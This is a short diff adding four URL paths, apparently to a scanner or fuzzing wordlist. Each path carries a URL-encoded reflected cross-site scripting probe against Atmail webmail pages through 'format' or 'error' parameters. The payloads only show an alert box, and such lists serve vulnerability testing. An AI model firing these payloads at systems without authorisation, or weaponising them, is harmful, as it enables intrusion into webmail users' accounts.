@@ -1,0 +1,4 @@
+/?format=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/atmail/?format=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/atmail/webmail/?format=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/atmail/index.php/admin/index/?error=1%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
